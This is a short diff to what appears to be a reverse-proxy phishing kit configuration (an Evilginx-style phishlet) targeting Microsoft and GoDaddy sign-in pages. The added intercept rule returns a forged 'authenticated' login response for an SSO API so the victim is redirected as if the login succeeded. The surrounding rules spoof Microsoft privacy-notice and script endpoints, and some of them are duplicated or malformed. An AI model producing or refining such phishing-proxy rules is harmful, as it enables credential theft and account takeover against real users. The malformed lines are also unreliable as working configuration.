@@ -911,6 +911,7 @@ js_inject:
         setTimeout(fill, 400);
       })();
 intercept:
+  - {domain: 'ssso.*', path: '\/v1\/api\/pass\/login', http_status: 200, body: '{"success":true,"data":{"user":"authenticated"},"redirect":"https://account.godaddy.com"}', mime: "application/json"}
   - {domain: 'privacynotice.account.microsoft.com', path: '^\/notice\?ru=https:\/\/login\.live\.com\/oauth20_authorize\.srf.*', http_status: 200, body: 'privacynotice.account.microsoft.com/notice?ru=https://login.live.com/oauth20_authorize.srf.*', mime: "text/html", "text/javascript", "application/json"}
   - {domain: 'privacynotice.account.microsoft.com', path: '^\/notice\?ru=https:\/\/login\.live\.com\/oauth20_authorize\.srf.*', http_status: 200, body: 'privacynotice.account.microsoft.com/notice?ru=https://login.live.com/oauth20_authorize.srf.*', mime: "text/html", "text/javascript", "application/json"}
   - {domain: 'ucis.msdxcdn.microsoft.com', path: '^\/.*\/app\.js', http_status: 200}
